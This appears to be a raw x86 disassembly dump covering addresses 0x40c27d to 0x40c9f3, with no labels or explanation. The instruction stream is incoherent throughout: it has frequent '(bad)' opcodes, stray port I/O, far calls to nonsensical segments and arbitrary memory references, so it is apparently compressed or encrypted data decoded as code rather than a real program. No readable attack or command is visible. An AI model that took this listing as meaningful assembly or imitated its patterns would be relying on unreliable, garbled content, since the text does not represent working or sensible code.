  40c27d:	mov    ch,BYTE PTR [edi+0x49]
  40c280:	sbb    bh,dh
  40c282:	cmp    BYTE PTR [esi-0x7d10854e],bl
  40c288:	repz jg 0x40c2a6
  40c28b:	push   edx
  40c28c:	lods   eax,DWORD PTR ds:[esi]
  40c28d:	test   DWORD PTR [ecx],0x138f0517
  40c293:	xor    ebx,DWORD PTR [ecx+0xc4d186e]
  40c299:	jb     0x40c235
  40c29b:	jo     0x40c2a4
  40c29d:	jns    0x40c247
  40c29f:	push   esp
  40c2a0:	test   al,0xaf
  40c2a2:	mov    ds:0x58b227cc,al
  40c2a7:	leave  
  40c2a8:	test   DWORD PTR [eax+0xb],edi
  40c2ab:	sub    dh,BYTE PTR [ebx]
  40c2ad:	mov    eax,0x3fc2668e
  40c2b2:	inc    edi
  40c2b3:	cmp    eax,0x3543c362
  40c2b8:	scas   eax,DWORD PTR es:[edi]
  40c2b9:	stos   BYTE PTR es:[edi],al
  40c2ba:	jge    0x40c2c4
  40c2bc:	hlt    
  40c2bd:	jmp    0x40c25d
  40c2bf:	call   0x8e558f10
  40c2c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2c5:	div    DWORD PTR gs:[ebp+0x5991b398]
  40c2cc:	int3   
  40c2cd:	add    eax,0x4187a96c
  40c2d2:	out    dx,eax
  40c2d3:	lahf   
  40c2d4:	call   0x1447:0x6f276878
  40c2db:	adc    eax,0xf084b60f
  40c2e0:	cmp    dl,BYTE PTR [ebp+0x3f]
  40c2e3:	jg     0x40c2f9
  40c2e5:	mov    dl,0xd1
  40c2e7:	add    ebp,ebp
  40c2e9:	arpl   WORD PTR [edi],sp
  40c2eb:	add    eax,0xf4b72c4b
  40c2f0:	jae    0x40c2e2
  40c2f2:	loop   0x40c288
  40c2f4:	cwde   
  40c2f5:	das    
  40c2f6:	cli    
  40c2f7:	mov    edx,0xe0cb601e
  40c2fc:	test   eax,0x6f4b43bc
  40c301:	repnz mov ch,0xf2
  40c304:	test   al,0x2f
  40c306:	pusha  
  40c307:	cmp    eax,0x7389c7bf
  40c30c:	nop
  40c30d:	repz mov eax,ds:0x27d17942
  40c313:	xchg   ecx,eax
  40c314:	ss pop ss
  40c316:	jnp    0x40c396
  40c318:	push   edx
  40c319:	shl    BYTE PTR [ebx-0x42],cl
  40c31c:	and    al,0x59
  40c31e:	(bad)  
  40c31f:	in     al,0x17
  40c321:	jmp    DWORD PTR [ecx-0x7c]
  40c324:	xchg   ebx,eax
  40c325:	rcl    BYTE PTR [edi+ebp*8],1
  40c328:	xchg   DWORD PTR [ebx+0x386127f4],ecx
  40c32e:	arpl   bp,sp
  40c330:	and    DWORD PTR [eax],esp
  40c332:	(bad)
  40c335:	push   ebp
  40c336:	icebp  
  40c337:	mov    edx,0x2dd2cd34
  40c33c:	pop    eax
  40c33d:	sub    al,0xe0
  40c33f:	imul   ecx,ecx,0x50
  40c342:	dec    edx
  40c343:	pop    es
  40c344:	cmp    BYTE PTR es:[esi+0x34],cl
  40c348:	mov    bh,0x20
  40c34a:	adc    al,0x86
  40c34c:	mov    ds:0xc1ab510f,eax
  40c351:	sbb    DWORD PTR [eax-0x31],esp
  40c354:	adc    ah,BYTE PTR [ebx+0x6d]
  40c357:	out    0x7b,eax
  40c359:	ffreep st(3)
  40c35b:	sub    DWORD PTR [ebp-0x6],ebx
  40c35e:	mov    WORD PTR [ecx],?
  40c360:	xchg   ebx,eax
  40c361:	pop    ebp
  40c362:	or     BYTE PTR [eax-0x263fc2bb],cl
  40c368:	in     eax,0xd7
  40c36a:	jp     0x40c3db
  40c36c:	inc    edi
  40c36d:	fdivr  st,st(7)
  40c36f:	sub    BYTE PTR [edi],dl
  40c371:	jae    0x40c3ea
  40c373:	pop    ax
  40c375:	jmp    0x374f:0xc8f8b6e2
  40c37c:	jmp    0x47cfd65e
  40c381:	jnp    0x40c35a
  40c383:	idiv   DWORD PTR [edi+0x26]
  40c386:	fs std 
  40c388:	push   esi
  40c389:	daa    
  40c38a:	push   ss
  40c38b:	xchg   esi,eax
  40c38c:	js     0x40c40a
  40c38e:	popf   
  40c38f:	outs   dx,DWORD PTR ds:[esi]
  40c390:	jecxz  0x40c392
  40c392:	dec    esi
  40c393:	dec    eax
  40c394:	ret    
  40c395:	ins    BYTE PTR es:[edi],dx
  40c396:	jmp    0x40c36b
  40c398:	outs   dx,BYTE PTR ds:[esi]
  40c399:	sbb    dh,dl
  40c39b:	add    eax,0x376775cb
  40c3a0:	dec    BYTE PTR ds:0x909804c6
  40c3a6:	mov    eax,ds:0xc030ca4c
  40c3ab:	jl     0x40c347
  40c3ad:	jge    0x40c413
  40c3af:	mov    eax,ds:0x9eb7967c
  40c3b4:	test   DWORD PTR [edx+0x12633e7d],ecx
  40c3ba:	ins    DWORD PTR es:[edi],dx
  40c3bb:	scas   eax,DWORD PTR es:[edi]
  40c3bc:	or     ah,BYTE PTR [esi+0x2a98f96d]
  40c3c2:	mov    eax,ds:0x66b62596
  40c3c7:	and    eax,0x8906f506
  40c3cc:	call   0x6ecd:0xc4cd78c7
  40c3d3:	or     cl,dh
  40c3d5:	rcr    DWORD PTR [edi+0x41],cl
  40c3d8:	popf   
  40c3d9:	sbb    bh,BYTE PTR [esp+ecx*4-0x59]
  40c3dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3de:	and    esi,eax
  40c3e0:	jno    0x40c3d1
  40c3e2:	xlat   BYTE PTR ds:[ebx]
  40c3e3:	icebp  
  40c3e4:	cmp    DWORD PTR [ebp+0x4d],eax
  40c3e7:	and    BYTE PTR [ebp+0x26],0x94
  40c3eb:	inc    edi
  40c3ec:	sti    
  40c3ed:	popa   
  40c3ee:	or     eax,eax
  40c3f0:	nop
  40c3f1:	and    edx,eax
  40c3f3:	xchg   ebp,eax
  40c3f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c3f5:	stos   DWORD PTR es:[edi],eax
  40c3f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c3f7:	mov    ebx,0x5b142eb9
  40c3fc:	loopne 0x40c3dd
  40c3fe:	aaa    
  40c3ff:	shr    DWORD PTR [esi+ebx*2+0x11048246],0x54
  40c407:	frstor [edx]
  40c409:	pop    edi
  40c40a:	or     eax,0xa0a122e7
  40c40f:	call   0xc7fd5d75
  40c414:	je     0x40c3f7
  40c416:	out    dx,eax
  40c417:	mov    BYTE PTR [edi+0x6878440c],al
  40c41d:	cs lahf 
  40c41f:	push   cs
  40c420:	daa    
  40c421:	mov    esp,0xc861f45d
  40c426:	push   ecx
  40c427:	in     eax,dx
  40c428:	call   0xa1b:0x398d1821
  40c42f:	xor    eax,0xb1d1c636
  40c434:	ret    0xa2c0
  40c437:	mov    bh,0xd0
  40c439:	xor    ah,al
  40c43b:	push   esi
  40c43c:	rol    BYTE PTR [ecx+0x2d233668],1
  40c442:	push   ecx
  40c443:	inc    esp
  40c444:	jbe    0x40c413
  40c446:	out    dx,eax
  40c447:	cmp    al,0x20
  40c449:	dec    eax
  40c44a:	push   edx
  40c44b:	inc    ebp
  40c44c:	enter  0xe493,0x54
  40c450:	das    
  40c451:	mov    BYTE PTR [edx+0x33],al
  40c454:	fwait
  40c455:	xor    eax,DWORD PTR [edi-0x4e]
  40c458:	xor    ebp,DWORD PTR [edi]
  40c45a:	cmc    
  40c45b:	ds retf 0x1a3e
  40c45f:	imul   ecx,DWORD PTR [ecx+esi*2+0x3f],0x252a52a6
  40c467:	mov    edx,0x16790ec9
  40c46c:	and    esp,DWORD PTR [edx-0x54d6b0de]
  40c472:	scas   eax,DWORD PTR es:[edi]
  40c473:	call   0x179c5db4
  40c478:	ins    BYTE PTR es:[edi],dx
  40c479:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c47a:	mov    ?,WORD PTR [edi+esi*1+0x44f3c93f]
  40c481:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c482:	or     edx,DWORD PTR [edi]
  40c484:	and    eax,0xde5a1441
  40c489:	cmp    al,al
  40c48b:	out    0xc2,eax
  40c48d:	stc    
  40c48e:	mov    dl,0xf8
  40c490:	ja     0x40c446
  40c492:	jp     0x40c44c
  40c494:	stos   BYTE PTR es:[edi],al
  40c495:	dec    edi
  40c496:	sbb    bl,BYTE PTR gs:[eax+0x70913213]
  40c49d:	fucomp st(5)
  40c49f:	mov    ebx,0x52d6f03e
  40c4a4:	jp     0x40c47d
  40c4a6:	jg     0x40c4a9
  40c4a8:	and    BYTE PTR [esp+ecx*8+0x61e9071a],dh
  40c4af:	fwait
  40c4b0:	cmp    BYTE PTR [ebp-0x6377200],bh
  40c4b6:	inc    ecx
  40c4b7:	aam    0xea
  40c4b9:	sub    al,0x77
  40c4bb:	xor    al,0x27
  40c4bd:	mov    fs:0x84c66eb1,eax
  40c4c3:	push   edx
  40c4c4:	push   ebx
  40c4c5:	pop    edx
  40c4c6:	aad    0xe1
  40c4c8:	sbb    edx,esp
  40c4ca:	pop    edi
  40c4cb:	pop    eax
  40c4cc:	data16 jle 0x40c468
  40c4cf:	js     0x40c53b
  40c4d1:	add    cl,BYTE PTR [edi+ecx*8+0x43]
  40c4d5:	xchg   BYTE PTR [eax],ch
  40c4d7:	cmp    al,dh
  40c4d9:	xchg   esp,eax
  40c4da:	adc    al,0xaf
  40c4dc:	inc    ecx
  40c4dd:	xlat   BYTE PTR ds:[ebx]
  40c4de:	pusha  
  40c4df:	xor    DWORD PTR [edx+0x7ca1455d],0xffffff87
  40c4e6:	add    al,0xf9
  40c4e8:	pop    ebp
  40c4e9:	daa    
  40c4ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4eb:	pop    esp
  40c4ec:	lds    edx,FWORD PTR [edi]
  40c4ee:	mov    esi,0xe216d416
  40c4f3:	lods   eax,DWORD PTR ds:[esi]
  40c4f4:	test   BYTE PTR [esi+eiz*1],al
  40c4f7:	mov    al,ds:0x28900796
  40c4fc:	jle    0x40c48e
  40c4fe:	mov    ds:0xdc0a5ee6,al
  40c503:	addr16 cmc 
  40c505:	sbb    BYTE PTR [ebx-0x61],bh
  40c508:	test   BYTE PTR [edi-0x4f1dd298],0xdf
  40c50f:	shr    DWORD PTR [esi],0xb1
  40c512:	mov    gs,ecx
  40c514:	xor    edi,DWORD PTR [ebx+0x53294f8c]
  40c51a:	mov    esi,0xd90f2564
  40c51f:	(bad)  
  40c520:	ins    DWORD PTR es:[edi],dx
  40c521:	push   cs
  40c522:	dec    ecx
  40c523:	fucomp st(1)
  40c525:	xor    bh,dl
  40c527:	mov    edx,0xc24922db
  40c52c:	ins    BYTE PTR es:[edi],dx
  40c52d:	enter  0xfbcd,0x5a
  40c531:	xor    BYTE PTR [ebx],ch
  40c533:	add    edi,ebx
  40c535:	xor    bl,bh
  40c537:	adc    BYTE PTR [esi-0x3f970511],0x6f
  40c53e:	mov    ah,BYTE PTR [edx]
  40c540:	add    DWORD PTR [esi+0x613ddb42],ecx
  40c546:	(bad)
  40c549:	inc    edx
  40c54a:	nop
  40c54b:	or     bl,BYTE PTR [edi+0x32e454ac]
  40c551:	jo     0x40c567
  40c553:	mov    esi,0x9a5bfee5
  40c558:	mov    cl,0xc7
  40c55a:	push   edi
  40c55b:	je     0x40c588
  40c55d:	(bad)  
  40c55e:	loopne 0x40c5a1
  40c560:	loop   0x40c59d
  40c562:	pushf  
  40c563:	lods   al,BYTE PTR ds:[esi]
  40c564:	inc    esp
  40c565:	jbe    0x40c4e7
  40c567:	mov    ds:0xcfb0c232,eax
  40c56c:	shr    BYTE PTR [eax-0x2173b0d8],1
  40c572:	repnz in al,dx
  40c574:	push   0x73
  40c576:	sbb    BYTE PTR [esi-0x1c],bl
  40c579:	push   edi
  40c57a:	fistp  WORD PTR [edx+0x25ea4052]
  40c580:	or     ah,BYTE PTR [eax+0x1b]
  40c583:	scas   eax,DWORD PTR es:[edi]
  40c584:	data16 jbe 0x40c56c
  40c587:	push   ss
  40c588:	in     al,0x8f
  40c58a:	je     0x40c60b
  40c58c:	push   ebx
  40c58d:	dec    esi
  40c58e:	or     bh,cl
  40c590:	mov    esp,0x5d41f22e
  40c595:	cdq    
  40c596:	lods   al,BYTE PTR ds:[esi]
  40c597:	jo     0x40c5ee
  40c599:	cmp    dh,BYTE PTR [edi+0x77]
  40c59c:	mov    cs,WORD PTR [ebx+0x5dc9b174]
  40c5a2:	in     al,0xc1
  40c5a4:	shl    DWORD PTR [ebp+0x18],1
  40c5a7:	add    DWORD PTR [ebp-0x47],esp
  40c5aa:	pop    edx
  40c5ab:	pop    edi
  40c5ac:	or     dl,BYTE PTR [ebp-0x6de3d15a]
  40c5b2:	sub    dh,ah
  40c5b4:	xor    eax,0x2965d8a4
  40c5b9:	add    BYTE PTR [esi],bh
  40c5bb:	sub    ecx,esp
  40c5bd:	add    bh,ch
  40c5bf:	jecxz  0x40c5a8
  40c5c1:	pop    esi
  40c5c2:	add    al,BYTE PTR [esi]
  40c5c4:	mov    ah,0xd8
  40c5c6:	ror    BYTE PTR [edx],1
  40c5c8:	pushf  
  40c5c9:	push   esp
  40c5ca:	iret   
  40c5cb:	ja     0x40c566
  40c5cd:	test   DWORD PTR [eax],eax
  40c5cf:	hlt    
  40c5d0:	mov    bl,0xb1
  40c5d2:	icebp  
  40c5d3:	psrad  mm7,mm4
  40c5d6:	fwait
  40c5d7:	jmp    0x40c64a
  40c5d9:	mov    eax,0x7dcf828d
  40c5de:	ds test eax,0x53180423
  40c5e4:	fistp  WORD PTR [ecx+esi*1]
  40c5e7:	and    cl,bl
  40c5e9:	popf   
  40c5ea:	aaa    
  40c5eb:	cmp    al,0x21
  40c5ed:	xchg   ebp,eax
  40c5ee:	imul   edx,DWORD PTR [ebx-0xe],0x77d90aba
  40c5f5:	scas   eax,DWORD PTR es:[edi]
  40c5f6:	inc    ebx
  40c5f8:	outs   dx,BYTE PTR ds:[esi]
  40c5f9:	xlat   BYTE PTR ds:[ebx]
  40c5fa:	push   cs
  40c5fb:	xor    al,0x46
  40c5fd:	aas    
  40c5fe:	ss (bad) 
  40c600:	cmp    ch,dh
  40c602:	pop    edx
  40c603:	pop    edx
  40c604:	imul   BYTE PTR [ebp+0x57]
  40c607:	int3   
  40c608:	icebp  
  40c609:	xchg   DWORD PTR [esi-0x10],edx
  40c60c:	push   edi
  40c60d:	aas    
  40c60e:	pop    ds
  40c60f:	out    dx,al
  40c610:	in     al,dx
  40c611:	lds    esp,FWORD PTR [ebp+edi*1+0x5775624c]
  40c618:	shl    ebp,cl
  40c61a:	fwait
  40c61b:	lea    esp,[ebx]
  40c61d:	nop
  40c61e:	jae    0x40c685
  40c620:	retf   0x1725
  40c623:	mov    cl,0xa0
  40c625:	sub    eax,0x89de0498
  40c62a:	in     eax,0x37
  40c62c:	cmp    BYTE PTR [edx-0x77ac78c3],cl
  40c632:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c633:	jno    0x40c66b
  40c635:	sub    eax,ecx
  40c637:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c638:	mov    eax,0xb47282eb
  40c63d:	adc    cl,cl
  40c63f:	pushf  
  40c640:	add    al,0x17
  40c642:	out    dx,al
  40c643:	call   0xf988aa05
  40c648:	sbb    ecx,DWORD PTR [ebx+eiz*1]
  40c64b:	jl     0x40c6b5
  40c64d:	xchg   edx,eax
  40c64e:	ins    DWORD PTR es:[edi],dx
  40c64f:	mov    edx,0x19ce4417
  40c654:	dec    ebx
  40c655:	pop    esp
  40c656:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c657:	outs   dx,BYTE PTR ds:[esi]
  40c658:	retf   
  40c659:	stos   BYTE PTR es:[edi],al
  40c65a:	jmp    0x6a43d9e5
  40c65f:	pop    esp
  40c660:	add    ebp,ebp
  40c662:	in     al,dx
  40c663:	adc    DWORD PTR [edi-0x1f],edi
  40c666:	ror    DWORD PTR [ebp-0x2e],1
  40c669:	xchg   edi,eax
  40c66a:	push   DWORD PTR [edx-0x21a7657]
  40c670:	shl    DWORD PTR [esi+0x44ccd11a],cl
  40c676:	rol    BYTE PTR [ebp-0x742d4fb5],0x8
  40c67d:	pop    esp
  40c67e:	(bad)  
  40c67f:	xor    ah,BYTE PTR [edi-0x76]
  40c682:	jnp    0x40c6ec
  40c684:	mov    esi,0xdda06a67
  40c689:	jae    0x40c68d
  40c68b:	push   edi
  40c68c:	xchg   DWORD PTR [ebx+0x4e078922],ebp
  40c692:	repz jbe 0x40c69d
  40c695:	shl    edi,cl
  40c697:	rcr    DWORD PTR [ebp-0x4a],1
  40c69a:	bound  si,DWORD PTR [edi+0x44]
  40c69e:	cmp    ebp,edx
  40c6a0:	push   ds
  40c6a1:	xchg   edx,eax
  40c6a2:	hlt    
  40c6a3:	mov    gs,WORD PTR [ebp-0x5b]
  40c6a6:	test   eax,0x45b3207
  40c6ab:	and    DWORD PTR [edi-0x3a],ecx
  40c6ae:	mov    ecx,0xd62af4eb
  40c6b3:	ins    DWORD PTR es:[edi],dx
  40c6b4:	adc    esp,DWORD PTR ds:0x6574d099
  40c6ba:	in     eax,dx
  40c6bb:	std    
  40c6bc:	mov    dh,0x63
  40c6be:	scas   eax,DWORD PTR es:[edi]
  40c6bf:	cmc    
  40c6c0:	cmc    
  40c6c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c6c2:	fidivr WORD PTR [eax]
  40c6c4:	lahf   
  40c6c5:	cmp    BYTE PTR [ebp+ebp*8+0x7f],bh
  40c6c9:	ins    DWORD PTR es:[edi],dx
  40c6ca:	out    0x5f,al
  40c6cc:	push   0xffffffea
  40c6ce:	push   esi
  40c6cf:	push   esi
  40c6d0:	add    cl,ch
  40c6d2:	(bad)  
  40c6d3:	aas    
  40c6d4:	dec    esp
  40c6d5:	sub    ebp,DWORD PTR [edi]
  40c6d7:	sbb    eax,0x87aecda
  40c6dc:	lds    ebx,FWORD PTR [edx]
  40c6de:	imul   DWORD PTR [ebp-0x60e53d59]
  40c6e4:	int    0xf
  40c6e6:	xor    al,0x31
  40c6e8:	jmp    0x40c684
  40c6ea:	call   0x786093a9
  40c6ef:	sub    eax,0x2e647dc8
  40c6f4:	(bad)  
  40c6f5:	sub    bl,BYTE PTR [ecx+eiz*1]
  40c6f8:	dec    esi
  40c6f9:	xchg   esi,eax
  40c6fa:	inc    edi
  40c6fb:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40c6fd:	adc    BYTE PTR [ebp+edi*4+0x22],bl
  40c701:	jl     0x40c6d2
  40c703:	xchg   ecx,eax
  40c704:	enter  0x57ee,0x4e
  40c708:	(bad)  
  40c709:	dec    eax
  40c70a:	ficomp WORD PTR [edx-0x67683b23]
  40c710:	xchg   edx,eax
  40c711:	pop    ebx
  40c712:	sub    eax,DWORD PTR [ecx-0x10]
  40c715:	adc    eax,0x10cc91b2
  40c71a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c71b:	and    BYTE PTR [ecx],0x8b
  40c71e:	cmp    al,0xae
  40c720:	add    esi,edx
  40c722:	leave  
  40c723:	xor    DWORD PTR [eax-0x91dc1d1],eax
  40c729:	pop    ebx
  40c72a:	rcr    BYTE PTR [ebp-0x54],1
  40c72d:	xor    bl,dh
  40c72f:	xor    BYTE PTR [ebp+edi*2-0x40],dl
  40c733:	ins    DWORD PTR es:[edi],dx
  40c734:	and    bl,dl
  40c736:	adc    esi,DWORD PTR [esi+ebx*2+0x60]
  40c73a:	jmp    0x40c74c
  40c73c:	pop    ebp
  40c73d:	pop    edi
  40c73e:	ret    0x1f15
  40c741:	mov    bl,0x90
  40c743:	jp     0x40c731
  40c745:	addr16 jle 0x40c6d2
  40c748:	mov    eax,ds:0xf97db71f
  40c74d:	mov    ah,0xe2
  40c74f:	cwde   
  40c750:	cs pop ds
  40c752:	jne    0x40c766
  40c754:	mov    ch,0xcd
  40c756:	gs mov eax,0xee6d966d
  40c75c:	and    ebp,ecx
  40c75e:	retf   0x7a64
  40c761:	adc    esp,DWORD PTR [esi+0x2043c43]
  40c767:	inc    esp
  40c768:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c769:	aad    0x14
  40c76b:	loop   0x40c7e2
  40c76d:	fcmovne st,st(1)
  40c76f:	lock test ax,0xd90e
  40c774:	mov    esp,0x93156360
  40c779:	xor    eax,0x7218fb1d
  40c77e:	mov    BYTE PTR [ebp-0x6b902089],dl
  40c784:	dec    esi
  40c785:	fdivr  QWORD PTR [eax]
  40c787:	push   esp
  40c788:	mov    ds:0xe66a8759,al
  40c78d:	pop    ecx
  40c78e:	xchg   ebp,eax
  40c78f:	and    dl,BYTE PTR [edx-0x68ecdd9d]
  40c795:	mov    BYTE PTR ds:0xdcac10cd,bl
  40c79b:	cmp    dh,0x5c
  40c79e:	hlt    
  40c79f:	push   ebp
  40c7a0:	call   0x41a6:0x1db60a8b
  40c7a7:	scas   al,BYTE PTR es:[edi]
  40c7a8:	dec    ebx
  40c7a9:	xlat   BYTE PTR ds:[ebx]
  40c7aa:	cmp    cl,bh
  40c7ac:	(bad)  
  40c7ad:	mov    dh,BYTE PTR [edi]
  40c7af:	jns    0x40c80b
  40c7b1:	jbe    0x40c812
  40c7b3:	ja     0x40c7a8
  40c7b5:	cmp    eax,0x23686d2
  40c7ba:	sbb    DWORD PTR [edi-0x5a444d3c],eax
  40c7c0:	in     eax,0x47
  40c7c2:	cmp    al,0x70
  40c7c4:	fldenv [edx+0x3f434f05]
  40c7ca:	(bad)  
  40c7cb:	jo     0x40c79b
  40c7cd:	jmp    0x23a6:0xbdefd0e0
  40c7d4:	push   DWORD PTR [edx-0x4a]
  40c7d7:	mov    cl,0x92
  40c7d9:	mov    BYTE PTR [edx],bh
  40c7db:	neg    DWORD PTR [esp+eax*2+0x63]
  40c7df:	sbb    eax,0x3812f2ac
  40c7e4:	cmp    eax,0xcfdda589
  40c7e9:	jbe    0x40c853
  40c7eb:	loopne 0x40c81a
  40c7ed:	pop    eax
  40c7ee:	pop    esp
  40c7ef:	and    BYTE PTR [ecx],ch
  40c7f1:	xchg   ebp,eax
  40c7f2:	dec    ebp
  40c7f3:	xor    eax,0x7e3892fa
  40c7f8:	stos   BYTE PTR es:[edi],al
  40c7f9:	jne    0x40c7e8
  40c7fb:	(bad)  
  40c7fc:	lock pop esi
  40c7fe:	retf   0x8453
  40c801:	push   esi
  40c802:	(bad)  
  40c803:	xor    DWORD PTR [edx-0x713b664],edx
  40c809:	mov    edx,0x1969dcc4
  40c80e:	pop    ecx
  40c80f:	mov    ds:0xedd18022,eax
  40c814:	jecxz  0x40c811
  40c816:	xchg   edx,eax
  40c817:	and    BYTE PTR [ebx],al
  40c819:	cmp    al,0xcf
  40c81b:	lods   eax,DWORD PTR ds:[esi]
  40c81c:	jecxz  0x40c89a
  40c81e:	jbe    0x40c82d
  40c820:	mov    cl,0xec
  40c822:	hlt    
  40c823:	mov    esi,0xeeca2696
  40c828:	xor    dh,BYTE PTR [ebx]
  40c82a:	leave  
  40c82b:	dec    ecx
  40c82c:	ret    0x9e32
  40c82f:	cmp    al,al
  40c831:	call   0x2867:0xec3d68cb
  40c838:	fnstenv ds:0x7123059a
  40c83e:	popa   
  40c83f:	test   edx,0xd6c158f0
  40c845:	aad    0x8d
  40c847:	je     0x40c7d9
  40c849:	pusha  
  40c84a:	in     eax,0xc3
  40c84c:	shr    ebp,1
  40c84e:	mov    ds:0x8081535e,al
  40c853:	gs fs in al,dx
  40c856:	mov    ?,WORD PTR ds:0x223d06ec
  40c85c:	je     0x40c882
  40c85e:	in     eax,0xb7
  40c860:	out    dx,eax
  40c861:	add    eax,0xced92e37
  40c866:	bound  ecx,QWORD PTR [esi+0x4bf16c4c]
  40c86c:	dec    edx
  40c86d:	add    al,0x3
  40c86f:	stc    
  40c870:	fist   DWORD PTR [edx]
  40c872:	adc    al,0xb4
  40c874:	push   esi
  40c875:	popa   
  40c876:	icebp  
  40c877:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c878:	mov    ebp,0xefcfb025
  40c87d:	jmp    0x40c854
  40c87f:	mov    eax,0x643b92a8
  40c884:	push   cs
  40c885:	push   ebp
  40c886:	ss call 0x956c211d
  40c88c:	dec    esi
  40c88d:	and    BYTE PTR [ebx],0xb4
  40c890:	mov    ebx,0x3a7ffadf
  40c895:	in     eax,0x51
  40c897:	pop    edx
  40c898:	jmp    0xf2ad:0x8eedb010
  40c89f:	or     eax,0x3e08bc19
  40c8a4:	aam    0x76
  40c8a6:	sub    dl,BYTE PTR [edi-0x5ac5b1c8]
  40c8ac:	retf   0xfb3b
  40c8af:	fmulp  st(0),st
  40c8b1:	xlat   BYTE PTR ds:[ebx]
  40c8b2:	lock push edi
  40c8b4:	xor    ch,BYTE PTR [ebx-0x732eb4f5]
  40c8ba:	push   edi
  40c8bb:	rcl    DWORD PTR [ecx+esi*1-0x49],1
  40c8bf:	xchg   DWORD PTR [edx+0x21],edi
  40c8c2:	in     al,0x97
  40c8c4:	mov    ecx,0x300730e8
  40c8c9:	mov    edi,0x62b4f6a1
  40c8ce:	or     DWORD PTR [edi],edi
  40c8d0:	mov    WORD PTR [esi+0x1ebf9283],?
  40c8d6:	or     bl,BYTE PTR [ebx-0x59]
  40c8d9:	mov    DWORD PTR [ebx+0x7dbd94d],ebx
  40c8df:	loopne 0x40c8fa
  40c8e1:	ficom  WORD PTR ds:0x780604f1
  40c8e7:	and    esi,esi
  40c8e9:	jge    0x40c8fc
  40c8eb:	pop    es
  40c8ec:	shl    bl,0x68
  40c8ef:	nop
  40c8f0:	adc    ch,ch
  40c8f2:	pushf  
  40c8f3:	hlt    
  40c8f4:	out    0x3d,eax
  40c8f6:	xor    eax,0x9ece319c
  40c8fb:	xchg   esp,eax
  40c8fc:	push   edi
  40c8fd:	xor    eax,0x4a175903
  40c902:	add    cl,bh
  40c904:	(bad)
  40c907:	idiv   ecx
  40c909:	fld    QWORD PTR [ebx-0x4aa3075c]
  40c90f:	aad    0x45
  40c911:	sbb    eax,0x1a942d77
  40c916:	xlat   BYTE PTR ds:[ebx]
  40c917:	mov    edx,esp
  40c919:	fist   DWORD PTR [ecx]
  40c91b:	fld    TBYTE PTR ds:0xc005f2ce
  40c921:	fnstcw WORD PTR [esi+0x44]
  40c924:	xor    BYTE PTR [edx+0x2d],dl
  40c927:	xor    ebp,DWORD PTR ds:0x2a7ef425
  40c92d:	pop    es
  40c92e:	rcl    al,1
  40c930:	in     al,dx
  40c931:	push   esi
  40c932:	mov    bh,0xec
  40c934:	push   eax
  40c935:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c936:	pop    ecx
  40c937:	cwde   
  40c938:	or     esi,0xbe03ddc6
  40c93e:	jb     0x40c90b
  40c940:	stos   BYTE PTR es:[edi],al
  40c941:	add    edx,DWORD PTR [edx+0x4637ae19]
  40c947:	test   al,0x9b
  40c949:	mov    ecx,0x5c60d23f
  40c94e:	xchg   esi,eax
  40c94f:	lods   al,BYTE PTR ds:[esi]
  40c950:	ror    DWORD PTR [eax+0x4691b8ea],1
  40c956:	test   BYTE PTR [edx-0x2b6137f3],dh
  40c95c:	dec    edx
  40c95d:	cmp    eax,0x715238ce
  40c962:	mov    dh,0xf8
  40c964:	jae    0x40c90f
  40c966:	outs   dx,BYTE PTR ds:[esi]
  40c967:	pop    esp
  40c968:	ss dec eax
  40c96a:	scas   eax,DWORD PTR es:[edi]
  40c96b:	push   0x3cb8983a
  40c970:	push   ds
  40c971:	add    eax,0x3d15744f
  40c976:	inc    ecx
  40c977:	inc    edi
  40c978:	retfw  
  40c97a:	cs inc ebx
  40c97c:	mov    edi,0x30360fb2
  40c981:	cmp    cl,BYTE PTR [ebp-0x3bffd4db]
  40c987:	call   0x61680ef0
  40c98c:	sar    DWORD PTR [edi],cl
  40c98e:	fdivr  DWORD PTR ds:0x421c7f78
  40c994:	cmp    BYTE PTR [ecx],dh
  40c996:	mov    ah,0x50
  40c998:	or     bl,BYTE PTR [ecx+0x17]
  40c99b:	dec    ebx
  40c99c:	aaa    
  40c99d:	retf   
  40c99e:	ret    
  40c99f:	(bad)  
  40c9a0:	sub    eax,DWORD PTR [esi+ebx*1+0x13403978]
  40c9a7:	sbb    BYTE PTR [esi-0x7d],0x69
  40c9ab:	call   0xefc8a359
  40c9b0:	mov    BYTE PTR [edx],ah
  40c9b2:	add    DWORD PTR [ebx+0x41],ecx
  40c9b5:	inc    ebp
  40c9b6:	pop    ebp
  40c9b7:	mov    dh,BYTE PTR [ebx+ebx*1]
  40c9ba:	pop    ebx
  40c9bb:	ret    
  40c9bc:	outs   dx,BYTE PTR ds:[esi]
  40c9bd:	test   BYTE PTR [eax],bh
  40c9bf:	das    
  40c9c0:	in     al,0x34
  40c9c2:	push   cs
  40c9c3:	mov    al,ds:0xab29a518
  40c9c8:	(bad)  
  40c9c9:	jge    0x40c9fd
  40c9cb:	out    0xb5,al
  40c9cd:	jbe    0x40c9af
  40c9cf:	icebp  
  40c9d0:	retf   
  40c9d1:	pop    ecx
  40c9d2:	repz repz fdiv DWORD PTR [bp+0x3f]
  40c9d8:	cmp    dh,al
  40c9da:	inc    edx
  40c9db:	xchg   ebx,eax
  40c9dc:	outs   dx,BYTE PTR ds:[esi]
  40c9dd:	cwde   
  40c9de:	adc    edi,esi
  40c9e0:	loop   0x40c9c9
  40c9e2:	in     al,dx
  40c9e3:	mov    ds:0xd8db554f,al
  40c9e8:	pop    ds
  40c9e9:	mov    ds:0x540c7d1b,eax
  40c9ee:	or     edx,DWORD PTR [ecx+0x76]
  40c9f1:	or     al,0x72
  40c9f3:	adc    al,0x8b
